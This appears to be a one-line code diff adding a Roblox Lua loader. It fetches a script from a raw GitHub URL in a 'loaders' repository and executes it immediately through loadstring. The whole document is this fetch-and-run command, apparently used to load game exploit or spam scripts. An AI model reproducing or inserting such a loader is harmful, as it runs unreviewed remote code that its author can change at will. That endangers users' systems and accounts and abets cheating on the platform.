@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/apple-ipad-original-spam1-0mkkmpeughf3st.lua"))()
